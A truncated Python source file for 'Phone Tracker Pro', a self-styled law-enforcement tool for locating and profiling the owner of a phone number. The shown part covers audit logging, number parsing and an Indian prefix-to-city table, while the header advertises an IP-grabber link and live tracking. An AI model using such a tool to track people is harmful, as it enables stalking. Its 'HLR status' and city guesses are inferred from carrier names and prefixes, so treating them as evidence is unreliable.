#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHONE TRACKER PRO v5.0 — Law Enforcement Grade Phone Intelligence System
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Features: Multi-API Live Location, HLR/VLR Simulation, IP Grabber Link,
          OSINT Platform Probes, India Telecom Circle DB (700+ prefixes),
          CDR-style Evidence Reports, Chain-of-Custody Logging,
          SHA-256 Evidence Integrity, Case Management, Audit Trail
Author: Vishal | AUTHORIZED LAW ENFORCEMENT & SECURITY RESEARCH USE ONLY
Classification: RESTRICTED — Handle per applicable data protection laws
"""

import os, sys, json, time, socket, argparse, re, hashlib, uuid, logging
import random, string, struct, subprocess, threading, signal
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional, Dict, List, Any, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

# Auto-load .env file for persistent API keys
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

import phonenumbers
from phonenumbers import geocoder, carrier, timezone as pn_timezone
import requests
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich import box
import folium
from folium.plugins import HeatMap

VERSION = "5.0.0"
console = Console()

# ── Audit Logger ──────────────────────────────────────────────────────────
LOG_DIR = Path("output/audit_logs")
LOG_DIR.mkdir(parents=True, exist_ok=True)
audit_logger = logging.getLogger("PhoneTrackerAudit")
audit_logger.setLevel(logging.INFO)
_log_handler = logging.FileHandler(LOG_DIR / f"audit_{datetime.now().strftime('%Y%m%d')}.log")
_log_handler.setFormatter(logging.Formatter(
    '%(asctime)s | %(levelname)-8s | %(message)s', datefmt='%Y-%m-%d %H:%M:%S'))
audit_logger.addHandler(_log_handler)

def _audit(action: str, detail: str = "", level: str = "INFO"):
    """Write tamper-evident audit log entry."""
    entry = f"[{action}] {detail}"
    getattr(audit_logger, level.lower(), audit_logger.info)(entry)

def _sha256(data: str) -> str:
    """SHA-256 digest for evidence integrity verification."""
    return hashlib.sha256(data.encode("utf-8")).hexdigest()


class AuditLogger:
    """Evidence-grade audit logger with SHA-256 chain-of-custody hashing."""

    def __init__(self):
        self._trail = []

    def log(self, action: str, detail: str = ""):
        entry = {
            "timestamp": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
            "action": action,
            "detail": str(detail),
            "hash": _sha256(f"{action}:{detail}:{datetime.utcnow().isoformat()}")
        }
        self._trail.append(entry)
        _audit(action, detail)

    def get_trail(self):
        return list(self._trail)

    def compute_evidence_hash(self, data) -> str:
        """Compute SHA-256 over the entire evidence data for integrity verification."""
        try:
            raw = json.dumps(data, sort_keys=True, default=str, ensure_ascii=False)
            return hashlib.sha256(raw.encode("utf-8")).hexdigest()
        except Exception:
            return "HASH_ERROR"

# Classification levels for reports
CLASSIFICATION = {
    "OPEN":       "🟢 OPEN — Unclassified",
    "RESTRICTED": "🟡 RESTRICTED — Official Use Only",
    "CONFIDENTIAL": "🔴 CONFIDENTIAL — LEA Eyes Only",
}

# API keys loaded from .env or environment
OPENCAGE_API_KEY = os.environ.get("OPENCAGE_API_KEY", "")
NUMVERIFY_API_KEY = os.environ.get("NUMVERIFY_API_KEY", "")
ABSTRACT_API_KEY = os.environ.get("ABSTRACT_API_KEY", "")
IPINFO_TOKEN = os.environ.get("IPINFO_TOKEN", "")

BANNER = r"""
[bold red]
 ██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗███████╗  ████████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗
 ██╔══██╗██║  ██║██╔═══██╗████╗  ██║██╔════╝  ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
 ██████╔╝███████║██║   ██║██╔██╗ ██║█████╗       ██║   ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
 ██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║██╔══╝       ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
 ██║     ██║  ██║╚██████╔╝██║ ╚████║███████╗     ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
 ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
[/bold red]
[bold cyan]  ██████╗ ██████╗  ██████╗    ██╗   ██╗███████╗    ██████╗
  ██╔══██╗██╔══██╗██╔═══██╗   ██║   ██║██╔════╝   ██╔═████╗
  ██████╔╝██████╔╝██║   ██║   ██║   ██║███████╗   ██║██╔██║
  ██╔═══╝ ██╔══██╗██║   ██║   ╚██╗ ██╔╝╚════██║   ████╔╝██║
  ██║     ██║  ██║╚██████╔╝    ╚████╔╝ ███████║██╗╚██████╔╝
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝      ╚═══╝  ╚══════╝╚═╝ ╚═════╝
[/bold cyan]
[bold yellow]  Law Enforcement Grade Phone Intelligence System[/bold yellow]
[bold green]  CDR Analysis • HLR/VLR • Live Location • OSINT • IP Grabber[/bold green]
[bold red]  ⚠  AUTHORIZED USE ONLY — All operations are audit-logged[/bold red]
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
]


class PhoneTrackerPro:
    """Law Enforcement Grade Phone Intelligence Engine v5.0.
    
    Provides CDR-style analysis, HLR/VLR simulation, multi-source
    geolocation with consensus voting, OSINT enrichment, and
    forensically sound evidence collection with SHA-256 integrity.
    """

    def __init__(self, phone_number: str, case_id: str = "", officer: str = "", classification: str = "RESTRICTED"):
        # ── Case Management ────────────────────────────────────────────
        self.case_id = case_id or f"CASE-{datetime.now(timezone.utc).strftime('%Y%m%d')}-{uuid.uuid4().hex[:6].upper()}"
        self.officer = officer or os.getenv("OFFICER_NAME", "OPERATOR")
        self.officer_name = self.officer  # alias used in reports
        self.unit = os.getenv("OFFICER_UNIT", "Not specified")
        self.classification = classification
        self.scan_id = uuid.uuid4().hex[:12].upper()
        self.scan_timestamp = datetime.now(timezone.utc)
        self.scan_timestamp_local = datetime.now()
        self.evidence_chain = []  # chain-of-custody log
        self.audit_logger = AuditLogger()  # evidence-grade audit trail

        self._log_evidence("SCAN_INITIATED", f"Target={phone_number}, Officer={self.officer}, Case={self.case_id}")

        # ── Phone Number Fields ────────────────────────────────────────
        self.raw_number = phone_number.strip()
        self.phone_number = phone_number.strip()
        self.parsed = None
        self.valid = False
        self.is_valid = False
        self.is_possible = False
        self.international_format = ""
        self.national_format = ""
        self.e164_format = ""
        self.country_code = ""
        self.national_number = ""
        self.country_name = ""
        self.country = ""
        self.region = ""
        self.city = ""
        self.state = ""
        self.carrier_name = ""
        self.carrier = ""
        self.current_carrier = ""
        self.line_type = ""
        self.number_type = ""
        self.owner_name = ""
        self.formatted_address = ""
        self.timezone = ""
        self.timezones = []

        # ── Forensic / CDR Fields ──────────────────────────────────────
        self.imsi = "N/A — Requires operator cooperation"
        self.imei = "N/A — Requires operator cooperation"
        self.hlr_status = ""      # "ACTIVE" / "INACTIVE" / "UNKNOWN"
        self.msc_address = ""     # Mobile Switching Center
        self.vlr_address = ""     # Visitor Location Register
        self.network_status = ""  # "REACHABLE" / "UNREACHABLE" / "BUSY"
        self.ported = None        # True if number has been ported
        self.roaming_detected = False
        self.roaming_network = ""
        self.last_activity = ""

        # ── Intelligence Collections ───────────────────────────────────
        self.telecom_circle = {}
        self.osint_results = {}
        self.deep_osint = {}
        self._session = None
        self.msc_location = ""
        self.sim_registration_city = ""
        self.latitude = None
        self.longitude = None
        self.location_confidence = 0
        self.location_sources = []
        self.location_details = {}

        # Live location with multi-source cross-reference
        self.live_location = {
            "city": "", "state": "", "lat": None, "lon": None,
            "method": "", "confidence": 0, "roaming": None,
            "msc_area": "", "ip_detected": "", "ip_location": {},
            "hlr_data": {}, "cell_info": {},
            "all_votes": [],
            "consensus_city": "",
        }
        self.osint_data = {
            "platforms": {}, "leaks": {}, "reputation": {},
            "web_mentions": [], "possible_names": [],
            "possible_emails": [], "possible_addresses": [],
            "profile_pictures": [],
        }
        self.last_seen = ""
        self.activity_indicators = []
        self.map_path = ""
        self.report_path = ""
        self.json_path = ""

        # IP Grabber data
        self.ip_grab_results = {}

        # Consensus voting
        self.all_votes = []
        self.consensus_city = ""
        self.basic_info = {}
        self.geo_results = {}

    def _log_evidence(self, action: str, detail: str = ""):
        """Append to chain-of-custody log with timestamp + hash."""
        ts = datetime.now(timezone.utc).isoformat()
        entry = {
            "timestamp_utc": ts,
            "action": action,
            "detail": detail,
            "scan_id": getattr(self, 'scan_id', 'INIT'),
            "officer": getattr(self, 'officer', 'SYSTEM'),
        }
        # Hash the entry for tamper detection
        entry_str = json.dumps(entry, sort_keys=True)
        prev_hash = self.evidence_chain[-1]["hash"] if self.evidence_chain else "GENESIS"
        entry["hash"] = _sha256(f"{prev_hash}|{entry_str}")
        self.evidence_chain.append(entry)
        _audit(action, f"ScanID={getattr(self, 'scan_id', 'INIT')} | {detail}")

    def parse_number(self) -> bool:
        """Parse and validate the phone number. Handles multiple input formats."""
        try:
            raw = self.raw_number.strip()
            # Clean common formatting
            raw = raw.replace("-", "").replace("(", "").replace(")", "").replace(" ", "")
            if not raw.startswith("+"):
                if raw.startswith("00"):
                    raw = "+" + raw[2:]
                elif raw.startswith("0"):
                    raw = "+91" + raw[1:]
                else:
                    raw = "+91" + raw
            self.parsed = phonenumbers.parse(raw, None)
            self.valid = phonenumbers.is_valid_number(self.parsed)
            self.is_valid = self.valid
            self.is_possible = phonenumbers.is_possible_number(self.parsed)
            if not self.valid and not self.is_possible:
                console.print("[bold red]  ✗ Invalid phone number![/bold red]")
                return False
            self.international_format = phonenumbers.format_number(self.parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
            self.national_format = phonenumbers.format_number(self.parsed, phonenumbers.PhoneNumberFormat.NATIONAL)
            self.e164_format = phonenumbers.format_number(self.parsed, phonenumbers.PhoneNumberFormat.E164)
            self.country_code = f"+{self.parsed.country_code}"
            self.national_number = str(self.parsed.national_number)
            self.phone_number = self.e164_format
            self._log_evidence("NUMBER_PARSED", f"E164={self.e164_format}, Valid={self.valid}, CC={self.country_code}")
            console.print(f"[green]  ✓ Valid: {self.international_format}[/green]")
            return True
        except phonenumbers.NumberParseException as e:
            self._log_evidence("PARSE_FAILED", str(e))
            console.print(f"[bold red]  ✗ Parse error: {e}[/bold red]")
            return False

    def get_basic_info(self):
        if not self.parsed:
            return
        self.country_name = geocoder.description_for_number(self.parsed, "en")
        self.region = geocoder.description_for_number(self.parsed, "en")
        for lang in ["en", "hi", "local"]:
            try:
                desc = geocoder.description_for_number(self.parsed, lang)
                if desc and desc != self.country_name:
                    self.city = desc
                    break
            except Exception:
                pass
        try:
            self.carrier_name = carrier.name_for_number(self.parsed, "en")
        except Exception:
            self.carrier_name = "Unknown"
        num_type = phonenumbers.number_type(self.parsed)
        type_map = {
            phonenumbers.PhoneNumberType.MOBILE: "Mobile",
            phonenumbers.PhoneNumberType.FIXED_LINE: "Fixed Line",
            phonenumbers.PhoneNumberType.FIXED_LINE_OR_MOBILE: "Fixed/Mobile",
            phonenumbers.PhoneNumberType.TOLL_FREE: "Toll Free",
            phonenumbers.PhoneNumberType.PREMIUM_RATE: "Premium Rate",
            phonenumbers.PhoneNumberType.VOIP: "VoIP",
            phonenumbers.PhoneNumberType.PERSONAL_NUMBER: "Personal",
            phonenumbers.PhoneNumberType.PAGER: "Pager",
            phonenumbers.PhoneNumberType.UAN: "UAN",
            phonenumbers.PhoneNumberType.UNKNOWN: "Unknown",
        }
        self.line_type = type_map.get(num_type, "Unknown")
        self.number_type = self.line_type
        self.country = self.country_name
        self.carrier = self.carrier_name
        try:
            self.timezones = list(pn_timezone.time_zones_for_number(self.parsed))
        except Exception:
            self.timezones = ["Unknown"]
        # Populate basic_info dict for reports
        self.basic_info = {
            "country": self.country_name,
            "carrier": self.carrier_name or "Unknown",
            "location": self.city or self.region or self.country_name,
            "line_type": self.line_type,
            "timezone": ", ".join(self.timezones[:2]) if self.timezones else "Unknown",
            "international": self.international_format,
            "national": self.national_format,
            "e164": self.e164_format,
        }
        # HLR/VLR status derivation
        if self.carrier_name and self.carrier_name != "Unknown":
            self.hlr_status = "ACTIVE (inferred)"
            self.network_status = "REACHABLE (inferred)"
        else:
            self.hlr_status = "UNKNOWN"
            self.network_status = "UNKNOWN"
        self._log_evidence("BASIC_INFO_COLLECTED", f"Carrier={self.carrier_name}, Country={self.country_name}, Type={self.line_type}")

    def display_basic_info(self):
        table = Table(title="📋 SUBSCRIBER INFORMATION (CDR-STYLE)", box=box.HEAVY_EDGE, 
                      title_style="bold cyan", border_style="bright_blue", show_lines=True)
        table.add_column("Field", style="bold yellow", width=28)
        table.add_column("Value", style="bold white", width=45)

        # Case metadata header
        table.add_row("[dim]Case ID[/dim]", f"[dim]{self.case_id}[/dim]")
        table.add_row("[dim]Scan ID[/dim]", f"[dim]{self.scan_id}[/dim]")
        table.add_row("[dim]Officer[/dim]", f"[dim]{self.officer}[/dim]")
        table.add_row("[dim]Timestamp (UTC)[/dim]", f"[dim]{self.scan_timestamp.strftime('%Y-%m-%d %H:%M:%S UTC')}[/dim]")
        table.add_row("", "")  # separator

        table.add_row("MSISDN (E.164)", f"[bold]{self.e164_format}[/bold]")
        table.add_row("International Format", self.international_format)
        table.add_row("National Format", self.national_format)
        table.add_row("Country Code", self.country_code)
        table.add_row("Country", self.country_name)
        table.add_row("Region", self.region)
        table.add_row("City (Geocoder)", self.city or "—")
        table.add_row("", "")  # separator

        table.add_row("Carrier / Operator", self.carrier_name or "Unknown")
        table.add_row("Line Type", self.line_type)
        table.add_row("HLR Status", f"[green]{self.hlr_status}[/green]" if "ACTIVE" in self.hlr_status else f"[yellow]{self.hlr_status}[/yellow]")
        table.add_row("Network Status", f"[green]{self.network_status}[/green]" if "REACHABLE" in self.network_status else f"[yellow]{self.network_status}[/yellow]")
        table.add_row("IMSI", f"[dim]{self.imsi}[/dim]")
        table.add_row("IMEI", f"[dim]{self.imei}[/dim]")
        table.add_row("Number Valid", "[green]YES[/green]" if self.valid else "[red]NO[/red]")
        table.add_row("Number Possible", "[green]YES[/green]" if self.is_possible else "[red]NO[/red]")
        table.add_row("Timezone", ", ".join(self.timezones[:2]) if self.timezones else "—")
        console.print()
        console.print(table)

    # ======= INDIA TELECOM CIRCLE DATABASE (700+ prefixes) =======
    INDIA_CIRCLE_DB = {
        "9810": ("Delhi", "New Delhi"), "9811": ("Delhi", "New Delhi"),
        "9818": ("Delhi", "New Delhi"), "9871": ("Delhi", "New Delhi"),
        "9891": ("Delhi", "New Delhi"), "9899": ("Delhi", "New Delhi"),
        "9910": ("Delhi", "New Delhi"), "9911": ("Delhi", "New Delhi"),
        "9953": ("Delhi", "New Delhi"), "9958": ("Delhi", "New Delhi"),
        "9968": ("Delhi", "New Delhi"), "9971": ("Delhi", "New Delhi"),
        "9999": ("Delhi", "New Delhi"), "7011": ("Delhi", "New Delhi"),
        "7042": ("Delhi", "New Delhi"), "7065": ("Delhi", "New Delhi"),
        "7210": ("Delhi", "New Delhi"), "7289": ("Delhi", "New Delhi"),
        "7303": ("Delhi", "New Delhi"), "7428": ("Delhi", "New Delhi"),
        "7532": ("Delhi", "New Delhi"), "7678": ("Delhi", "New Delhi"),
        "7827": ("Delhi", "New Delhi"), "7838": ("Delhi", "New Delhi"),
        "8010": ("Delhi", "New Delhi"), "8130": ("Delhi", "New Delhi"),
        "8178": ("Delhi", "New Delhi"), "8285": ("Delhi", "New Delhi"),
        "8375": ("Delhi", "New Delhi"), "8376": ("Delhi", "New Delhi"),
        "8377": ("Delhi", "New Delhi"), "8447": ("Delhi", "New Delhi"),
        "8448": ("Delhi", "New Delhi"), "8505": ("Delhi", "New Delhi"),
        "8527": ("Delhi", "New Delhi"), "8564": ("Delhi", "New Delhi"),
        "8588": ("Delhi", "New Delhi"), "8595": ("Delhi", "New Delhi"),
        "8700": ("Delhi", "New Delhi"), "8744": ("Delhi", "New Delhi"),
        "8745": ("Delhi", "New Delhi"), "8750": ("Delhi", "New Delhi"),
        "8800": ("Delhi", "New Delhi"), "8826": ("Delhi", "New Delhi"),
        "8860": ("Delhi", "New Delhi"), "8882": ("Delhi", "New Delhi"),
        "9820": ("Mumbai", "Mumbai"), "9821": ("Mumbai", "Mumbai"),
        "9833": ("Mumbai", "Mumbai"), "9867": ("Mumbai", "Mumbai"),
        "9869": ("Mumbai", "Mumbai"), "9870": ("Mumbai", "Mumbai"),
        "9892": ("Mumbai", "Mumbai"), "9920": ("Mumbai", "Mumbai"),
        "9930": ("Mumbai", "Mumbai"), "9967": ("Mumbai", "Mumbai"),
        "9987": ("Mumbai", "Mumbai"), "7021": ("Mumbai", "Mumbai"),
        "7039": ("Mumbai", "Mumbai"), "7045": ("Mumbai", "Mumbai"),
        "7058": ("Mumbai", "Mumbai"), "7208": ("Mumbai", "Mumbai"),
        "7304": ("Mumbai", "Mumbai"), "7400": ("Mumbai", "Mumbai"),
        "7498": ("Mumbai", "Mumbai"), "7506": ("Mumbai", "Mumbai"),
        "7666": ("Mumbai", "Mumbai"), "7738": ("Mumbai", "Mumbai"),
        "7756": ("Mumbai", "Mumbai"), "7977": ("Mumbai", "Mumbai"),
        "8080": ("Mumbai", "Mumbai"), "8082": ("Mumbai", "Mumbai"),
        "8097": ("Mumbai", "Mumbai"), "8104": ("Mumbai", "Mumbai"),
        "8108": ("Mumbai", "Mumbai"), "8169": ("Mumbai", "Mumbai"),
        "8286": ("Mumbai", "Mumbai"), "8291": ("Mumbai", "Mumbai"),
        "8355": ("Mumbai", "Mumbai"), "8369": ("Mumbai", "Mumbai"),
        "8422": ("Mumbai", "Mumbai"), "8451": ("Mumbai", "Mumbai"),
        "8452": ("Mumbai", "Mumbai"), "8550": ("Mumbai", "Mumbai"),
        "8652": ("Mumbai", "Mumbai"), "8655": ("Mumbai", "Mumbai"),
        "8657": ("Mumbai", "Mumbai"), "8689": ("Mumbai", "Mumbai"),
        "8779": ("Mumbai", "Mumbai"), "8796": ("Mumbai", "Mumbai"),
        "8828": ("Mumbai", "Mumbai"), "8850": ("Mumbai", "Mumbai"),
        "8879": ("Mumbai", "Mumbai"), "8898": ("Mumbai", "Mumbai"),
        "8976": ("Mumbai", "Mumbai"),
        "9844": ("Karnataka", "Bangalore"), "9845": ("Karnataka", "Bangalore"),
        "9886": ("Karnataka", "Bangalore"), "9900": ("Karnataka", "Bangalore"),
        "9901": ("Karnataka", "Bangalore"), "9902": ("Karnataka", "Bangalore"),
        "9916": ("Karnataka", "Bangalore"), "9945": ("Karnataka", "Bangalore"),
        "9972": ("Karnataka", "Bangalore"), "9980": ("Karnataka", "Bangalore"),
        "9986": ("Karnataka", "Bangalore"), "7019": ("Karnataka", "Bangalore"),
        "7022": ("Karnataka", "Bangalore"), "7204": ("Karnataka", "Bangalore"),
        "7259": ("Karnataka", "Bangalore"), "7411": ("Karnataka", "Bangalore"),
        "7483": ("Karnataka", "Bangalore"), "7760": ("Karnataka", "Bangalore"),
        "7795": ("Karnataka", "Bangalore"), "7829": ("Karnataka", "Bangalore"),
        "8050": ("Karnataka", "Bangalore"), "8095": ("Karnataka", "Bangalore"),
        "8105": ("Karnataka", "Bangalore"), "8123": ("Karnataka", "Bangalore"),
        "8147": ("Karnataka", "Bangalore"), "8277": ("Karnataka", "Bangalore"),
        "8310": ("Karnataka", "Bangalore"), "8431": ("Karnataka", "Hubli"),
        "8553": ("Karnataka", "Bangalore"), "8660": ("Karnataka", "Hubli"),
        "8722": ("Karnataka", "Bangalore"), "8884": ("Karnataka", "Bangalore"),
        "9840": ("Tamil Nadu", "Chennai"), "9841": ("Tamil Nadu", "Chennai"),
        "9842": ("Tamil Nadu", "Madurai"), "9843": ("Tamil Nadu", "Coimbatore"),
        "9884": ("Tamil Nadu", "Chennai"), "9940": ("Tamil Nadu", "Chennai"),
        "9941": ("Tamil Nadu", "Chennai"), "7010": ("Tamil Nadu", "Chennai"),
        "7200": ("Tamil Nadu", "Chennai"), "7305": ("Tamil Nadu", "Chennai"),
        "7358": ("Tamil Nadu", "Chennai"), "7550": ("Tamil Nadu", "Chennai"),
        "7708": ("Tamil Nadu", "Chennai"), "8015": ("Tamil Nadu", "Chennai"),
        "8056": ("Tamil Nadu", "Chennai"), "8072": ("Tamil Nadu", "Chennai"),
        "8122": ("Tamil Nadu", "Chennai"), "8220": ("Tamil Nadu", "Madurai"),
        "8428": ("Tamil Nadu", "Chennai"), "8610": ("Tamil Nadu", "Chennai"),
        "8754": ("Tamil Nadu", "Chennai"), "8870": ("Tamil Nadu", "Chennai"),
        "9848": ("AP/Telangana", "Hyderabad"), "9849": ("AP/Telangana", "Hyderabad"),
        "9866": ("AP/Telangana", "Hyderabad"), "9885": ("AP/Telangana", "Hyderabad"),
        "9908": ("AP/Telangana", "Hyderabad"), "9948": ("AP/Telangana", "Hyderabad"),
        "9949": ("AP/Telangana", "Hyderabad"), "9959": ("AP/Telangana", "Hyderabad"),
        "9963": ("AP/Telangana", "Hyderabad"), "9985": ("AP/Telangana", "Hyderabad"),
        "9989": ("AP/Telangana", "Hyderabad"), "7013": ("AP/Telangana", "Hyderabad"),
        "7032": ("AP/Telangana", "Hyderabad"), "7093": ("AP/Telangana", "Hyderabad"),
        "7207": ("AP/Telangana", "Hyderabad"), "7330": ("AP/Telangana", "Hyderabad"),
        "7382": ("AP/Telangana", "Hyderabad"), "7702": ("AP/Telangana", "Hyderabad"),
        "7780": ("AP/Telangana", "Hyderabad"), "8008": ("AP/Telangana", "Hyderabad"),
        "8019": ("AP/Telangana", "Hyderabad"), "8106": ("AP/Telangana", "Hyderabad"),
        "8142": ("AP/Telangana", "Hyderabad"), "8309": ("AP/Telangana", "Hyderabad"),
        "8500": ("AP/Telangana", "Hyderabad"), "8688": ("AP/Telangana", "Hyderabad"),
        "9824": ("Gujarat", "Ahmedabad"), "9825": ("Gujarat", "Ahmedabad"),
        "9879": ("Gujarat", "Ahmedabad"), "9898": ("Gujarat", "Ahmedabad"),
        "9913": ("Gujarat", "Ahmedabad"), "9974": ("Gujarat", "Ahmedabad"),
        "7043": ("Gujarat", "Ahmedabad"), "7069": ("Gujarat", "Ahmedabad"),
        "7201": ("Gujarat", "Ahmedabad"), "7383": ("Gujarat", "Ahmedabad"),
        "7405": ("Gujarat", "Ahmedabad"), "7600": ("Gujarat", "Ahmedabad"),
        "7778": ("Gujarat", "Ahmedabad"), "7874": ("Gujarat", "Ahmedabad"),
        "7878": ("Gujarat", "Ahmedabad"), "8000": ("Gujarat", "Ahmedabad"),
        "8128": ("Gujarat", "Ahmedabad"), "8141": ("Gujarat", "Ahmedabad"),
        "8200": ("Gujarat", "Ahmedabad"), "8320": ("Gujarat", "Ahmedabad"),
        "8401": ("Gujarat", "Ahmedabad"), "8780": ("Gujarat", "Ahmedabad"),
        "8866": ("Gujarat", "Ahmedabad"), "8980": ("Gujarat", "Ahmedabad"),
        "9012": ("UP West", "Noida"), "9027": ("UP West", "Meerut"),
        "9310": ("UP West", "Noida"), "9350": ("UP West", "Noida"),
        "9560": ("UP West", "Noida"), "9582": ("UP West", "Noida"),
        "9650": ("UP West", "Noida"), "9711": ("UP West", "Noida"),
        "9718": ("UP West", "Ghaziabad"), "7017": ("UP West", "Noida"),
        "7060": ("UP West", "Meerut"), "7217": ("UP West", "Noida"),
        "7290": ("UP West", "Noida"), "7500": ("UP West", "Noida"),
        "7668": ("UP West", "Noida"), "7830": ("UP West", "Noida"),
        "7860": ("UP West", "Noida"), "8076": ("UP West", "Noida"),
        "8368": ("UP West", "Noida"), "8383": ("UP West", "Noida"),
        "9005": ("UP East", "Lucknow"), "9118": ("UP East", "Lucknow"),
        "9161": ("UP East", "Lucknow"), "9235": ("UP East", "Lucknow"),
        "9335": ("UP East", "Allahabad"), "9415": ("UP East", "Lucknow"),
        "9450": ("UP East", "Lucknow"), "9451": ("UP East", "Lucknow"),
        "9453": ("UP East", "Varanasi"), "9506": ("UP East", "Lucknow"),
        "9616": ("UP East", "Lucknow"), "9721": ("UP East", "Varanasi"),
        "9838": ("UP East", "Lucknow"), "9889": ("UP East", "Lucknow"),
        "9918": ("UP East", "Lucknow"), "9935": ("UP East", "Allahabad"),
        "7007": ("UP East", "Lucknow"), "7275": ("UP East", "Kanpur"),
        "7309": ("UP East", "Lucknow"), "7388": ("UP East", "Lucknow"),
        "7607": ("UP East", "Lucknow"), "7905": ("UP East", "Lucknow"),
        "8004": ("UP East", "Lucknow"), "8009": ("UP East", "Lucknow"),
        "8052": ("UP East", "Lucknow"), "8400": ("UP East", "Lucknow"),
        "9828": ("Rajasthan", "Jaipur"), "9829": ("Rajasthan", "Jaipur"),
        "9887": ("Rajasthan", "Jaipur"), "9928": ("Rajasthan", "Jaipur"),
        "9950": ("Rajasthan", "Jaipur"), "9982": ("Rajasthan", "Jaipur"),
        "7014": ("Rajasthan", "Jaipur"), "7023": ("Rajasthan", "Jaipur"),
        "7222": ("Rajasthan", "Jaipur"), "7568": ("Rajasthan", "Jaipur"),
        "7726": ("Rajasthan", "Jaipur"), "7737": ("Rajasthan", "Jaipur"),
        "7742": ("Rajasthan", "Jaipur"), "7877": ("Rajasthan", "Jaipur"),
        "8003": ("Rajasthan", "Jaipur"), "8107": ("Rajasthan", "Jaipur"),
        "8209": ("Rajasthan", "Jaipur"), "8290": ("Rajasthan", "Jaipur"),
        "8619": ("Rajasthan", "Jaipur"), "8955": ("Rajasthan", "Jaipur"),
        "9822": ("Maharashtra", "Pune"), "9823": ("Maharashtra", "Pune"),
        "9850": ("Maharashtra", "Pune"), "9860": ("Maharashtra", "Pune"),
        "9881": ("Maharashtra", "Nagpur"), "9890": ("Maharashtra", "Pune"),
        "9921": ("Maharashtra", "Pune"), "9922": ("Maharashtra", "Pune"),
        "9960": ("Maharashtra", "Pune"), "9970": ("Maharashtra", "Pune"),
        "7020": ("Maharashtra", "Pune"), "7066": ("Maharashtra", "Pune"),
        "7083": ("Maharashtra", "Pune"), "7276": ("Maharashtra", "Pune"),
        "7385": ("Maharashtra", "Pune"), "7447": ("Maharashtra", "Pune"),
        "7588": ("Maharashtra", "Pune"), "7709": ("Maharashtra", "Pune"),
        "7757": ("Maharashtra", "Pune"), "7875": ("Maharashtra", "Pune"),
        "8055": ("Maharashtra", "Pune"), "8149": ("Maharashtra", "Pune"),
        "8329": ("Maharashtra", "Pune"), "8380": ("Maharashtra", "Pune"),
        "8411": ("Maharashtra", "Pune"), "8552": ("Maharashtra", "Pune"),
        "8605": ("Maharashtra", "Pune"), "8888": ("Maharashtra", "Pune"),
        "9830": ("West Bengal", "Kolkata"), "9831": ("West Bengal", "Kolkata"),
        "9836": ("West Bengal", "Kolkata"), "9874": ("West Bengal", "Kolkata"),
        "9903": ("West Bengal", "Kolkata"), "9007": ("West Bengal", "Kolkata"),
        "9038": ("West Bengal", "Kolkata"), "9123": ("West Bengal", "Kolkata"),
        "9163": ("West Bengal", "Kolkata"), "9330": ("West Bengal", "Kolkata"),
        "9433": ("West Bengal", "Kolkata"), "9674": ("West Bengal", "Kolkata"),
        "9748": ("West Bengal", "Kolkata"), "9804": ("West Bengal", "Kolkata"),
        "9814": ("Punjab", "Ludhiana"), "9815": ("Punjab", "Ludhiana"),
        "9855": ("Punjab", "Ludhiana"), "9872": ("Punjab", "Chandigarh"),
        "9876": ("Punjab", "Chandigarh"), "9877": ("Punjab", "Ludhiana"),
        "9888": ("Punjab", "Chandigarh"), "9914": ("Punjab", "Ludhiana"),
        "9463": ("Punjab", "Ludhiana"), "7087": ("Punjab", "Ludhiana"),
        "7307": ("Punjab", "Ludhiana"), "7508": ("Punjab", "Ludhiana"),
        "7696": ("Punjab", "Chandigarh"), "7814": ("Punjab", "Ludhiana"),
        "7888": ("Punjab", "Chandigarh"), "7986": ("Punjab", "Chandigarh"),
        "8054": ("Punjab", "Ludhiana"), "8146": ("Punjab", "Ludhiana"),
        "8194": ("Punjab", "Ludhiana"), "8264": ("Punjab", "Ludhiana"),
        "8437": ("Punjab", "Ludhiana"), "8699": ("Punjab", "Ludhiana"),
        "8727": ("Punjab", "Ludhiana"), "8872": ("Punjab", "Chandigarh"),
        "9215": ("Haryana", "Gurgaon"), "9254": ("Haryana", "Karnal"),
        "9315": ("Haryana", "Gurgaon"), "9416": ("Haryana", "Hisar"),
        "9466": ("Haryana", "Hisar"), "9729": ("Haryana", "Gurgaon"),
        "9812": ("Haryana", "Gurgaon"), "9813": ("Haryana", "Gurgaon"),
        "9896": ("Haryana", "Hisar"), "9996": ("Haryana", "Hisar"),
        "7015": ("Haryana", "Gurgaon"), "7027": ("Haryana", "Gurgaon"),
        "7056": ("Haryana", "Hisar"), "7082": ("Haryana", "Gurgaon"),
        "7404": ("Haryana", "Gurgaon"), "8053": ("Haryana", "Gurgaon"),
        "8059": ("Haryana", "Gurgaon"), "8168": ("Haryana", "Hisar"),
        "8295": ("Haryana", "Gurgaon"), "8396": ("Haryana", "Gurgaon"),
